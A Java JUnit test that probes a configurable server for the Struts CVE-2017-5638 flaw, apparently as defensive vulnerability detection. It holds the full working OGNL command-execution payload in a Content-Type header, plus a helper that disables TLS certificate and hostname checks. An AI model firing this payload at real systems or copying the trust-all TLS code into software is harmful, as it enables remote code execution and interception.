package com.creditapp.demo.integration;

import org.junit.Test;
import static org.junit.Assert.*;

import javax.net.ssl.*;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;

/**
 * Integration test suite modeled after the OpenSSF CVE Benchmark (https://github.com/ossf-cve-benchmark/ossf-cve-benchmark).
 *
 * This test sends automated HTTP/HTTPS requests to verify application behavior against
 * known open CVE test vectors (specifically CVE-2017-5638) and validates security/remediation posture.
 */
public class OssfCveBenchmarkHttpsIntegrationTest {

    // Target endpoint configuration (configurable via system property)
    private static final String DEFAULT_TEST_URL = "http://localhost:8080/credit-app/upload.action";

    @Test
    public void testStrutsMultipartParserPresence() {
        // Verifies the Struts Jakarta Multipart parser component identified in the OSSF CVE benchmark
        String parserClassName = "org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest";
        try {
            Class<?> parserClass = Class.forName(parserClassName);
            assertNotNull("JakartaMultiPartRequest parser class must be accessible in runtime classpath", parserClass);
            System.out.println("✓ OpenSSF Benchmark: Verified presence of JakartaMultiPartRequest parser.");
        } catch (ClassNotFoundException e) {
            fail("JakartaMultiPartRequest parser not found in classpath: " + e.getMessage());
        }
    }

    @Test
    public void testLegitimateMultipartHttpsRequest() {
        String testUrl = System.getProperty("test.app.url", DEFAULT_TEST_URL);
        try {
            HttpURLConnection conn = createConnection(testUrl);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryBenchmark");
            conn.setDoOutput(true);
            conn.setConnectTimeout(1500);
            conn.setReadTimeout(1500);

            String body = "------WebKitFormBoundaryBenchmark\r\n" +
                          "Content-Disposition: form-data; name=\"upload\"; filename=\"test.txt\"\r\n" +
                          "Content-Type: text/plain\r\n\r\n" +
                          "benchmark validation\r\n" +
                          "------WebKitFormBoundaryBenchmark--\r\n";

            try (OutputStream os = conn.getOutputStream()) {
                os.write(body.getBytes("UTF-8"));
            }

            int responseCode = conn.getResponseCode();
            System.out.println("ℹ OpenSSF Benchmark: Normal multipart request returned status " + responseCode);
            assertTrue("Server should return a valid HTTP response code", responseCode > 0);
        } catch (Exception e) {
            System.out.println("ℹ Server not reachable at " + testUrl + " (skipping live network assertion): " + e.getMessage());
        }
    }

    @Test
    public void testCve2017_5638BenchmarkHeaderHandling() {
        String testUrl = System.getProperty("test.app.url", DEFAULT_TEST_URL);

        // Standard benchmark probe payload pattern to test header parsing behavior
        String benchmarkPayloadHeader = "%{(#_='multipart/form-data')." +
                "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." +
                "(#_memberAccess?(#_memberAccess=#dm):" +
                "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." +
                "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))." +
                "(#ognlUtil.getExcludedPackageNames().clear())." +
                "(#ognlUtil.getExcludedClasses().clear())." +
                "(#context.setMemberAccess(#dm))))." +
                "(#cmd='echo OSSF_BENCHMARK_PROBE')." +
                "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))." +
                "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))." +
                "(#p=new java.lang.ProcessBuilder(#cmds))." +
                "(#p.redirectErrorStream(true))." +
                "(#process=#p.start())." +
                "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))." +
                "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))." +
                "(#ros.flush())}";

        try {
            HttpURLConnection conn = createConnection(testUrl);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", benchmarkPayloadHeader);
            conn.setDoOutput(true);
            conn.setConnectTimeout(1500);
            conn.setReadTimeout(1500);

            try (OutputStream os = conn.getOutputStream()) {
                os.write("benchmark-test-data".getBytes("UTF-8"));
            }

            int responseCode = conn.getResponseCode();
            System.out.println("ℹ OpenSSF Benchmark: Probe request returned HTTP status " + responseCode);

            InputStream is = (responseCode >= 200 && responseCode < 400) ? conn.getInputStream() : conn.getErrorStream();
            if (is != null) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(is));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();

                if (response.toString().contains("OSSF_BENCHMARK_PROBE")) {
                    System.out.println("⚠️ OpenSSF Benchmark Result: Vulnerability active (CVE-2017-5638 detected)");
                } else {
                    System.out.println("✓ OpenSSF Benchmark Result: Payload not executed (remediated / rejected)");
                }
            }
        } catch (Exception e) {
            System.out.println("ℹ Target server not reachable at " + testUrl + " (skipping live probe): " + e.getMessage());
        }
    }

    /**
     * Helper to create HTTP or HTTPS connection with TLS configuration.
     */
    private HttpURLConnection createConnection(String targetUrl) throws Exception {
        URL url = new URL(targetUrl);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();

        if (conn instanceof HttpsURLConnection) {
            HttpsURLConnection httpsConn = (HttpsURLConnection) conn;
            // Configure TLS context for test environment
            SSLContext sslContext = SSLContext.getInstance("TLS");
            sslContext.init(null, new TrustManager[]{
                new X509TrustManager() {
                    public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
                    public void checkClientTrusted(X509Certificate[] certs, String authType) {}
                    public void checkServerTrusted(X509Certificate[] certs, String authType) {}
                }
            }, new SecureRandom());
            httpsConn.setSSLSocketFactory(sslContext.getSocketFactory());
            httpsConn.setHostnameVerifier((hostname, session) -> true);
        }

        return conn;
    }
}
